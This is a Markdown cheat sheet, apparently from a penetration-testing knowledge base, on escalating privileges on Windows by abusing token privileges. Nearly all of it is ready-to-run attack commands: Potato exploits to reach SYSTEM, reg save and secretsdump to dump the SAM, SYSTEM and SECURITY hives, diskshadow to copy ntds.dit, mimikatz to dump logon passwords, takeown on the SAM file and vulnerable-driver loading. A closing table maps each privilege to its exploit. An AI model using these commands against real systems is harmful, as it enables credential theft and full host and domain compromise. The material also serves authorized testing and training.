---
title: Token Privilege Abuse
category: privesc-windows
description: SeImpersonate, SeAssignPrimaryToken, SeBackup, SeDebug, SeRestore.
tags: [windows, privesc, tokens]
os: [windows]
order: 10
---

## SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

Service accounts (IIS, MSSQL) typically have these. → "Potato" family:

```cmd
:: PrintSpoofer (Server 2019/2022 + Win10/11)
PrintSpoofer.exe -i -c cmd

:: GodPotato (.NET 3.5+; works where PrintSpoofer doesn't)
GodPotato.exe -cmd "cmd /c whoami"

:: RoguePotato (older paths)
RoguePotato.exe -r {{LHOST}} -e "cmd" -l 9999

:: JuicyPotatoNG (modern, COM-based)
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe"
```

## SeBackupPrivilege + SeRestorePrivilege

Read SYSTEM/SAM/SECURITY hives → offline DCSync / hash dump:

```cmd
reg save HKLM\SYSTEM C:\Temp\sys.hiv
reg save HKLM\SAM C:\Temp\sam.hiv
reg save HKLM\SECURITY C:\Temp\sec.hiv
```

```bash
impacket-secretsdump -system sys.hiv -sam sam.hiv -security sec.hiv LOCAL
```

If on a DC, also `ntds.dit`:

```cmd
diskshadow /s shadow.txt
:: where shadow.txt contains:
::   set context persistent nowriters
::   add volume C: alias x
::   create
::   expose %x% Z:
robocopy Z:\Windows\NTDS C:\Temp ntds.dit
```

## SeDebugPrivilege

Open any process token — e.g., grab a SYSTEM token:

```text
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
```

## SeTakeOwnershipPrivilege

```cmd
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant {{USER}}:F
```

## SeManageVolumePrivilege

```cmd
SeManageVolumeExploit.exe        :: grants Everyone:F on C:\
```

## SeLoadDriverPrivilege

Load a vulnerable signed driver (BYOVD), then exploit it. Common: `dbutil_2_3.sys`, `gdrv.sys`, `RTCore64.sys`. Use [LOLDrivers](https://www.loldrivers.io/).

## Quick "what's actually exploitable" decision

```text
SeImpersonate / SeAssignPrimaryToken  →  Potato → SYSTEM
SeDebug                               →  mimikatz / steal token
SeBackup + SeRestore                  →  dump hives → secretsdump → PtH
SeTakeOwnership                       →  rewrite SAM ACLs → dump hashes
SeManageVolume                        →  grant Everyone:F on C:\ → plant exec
SeLoadDriver                          →  BYOVD
SeTrustedCredManAccess                →  vaultcli → DPAPI secrets
```
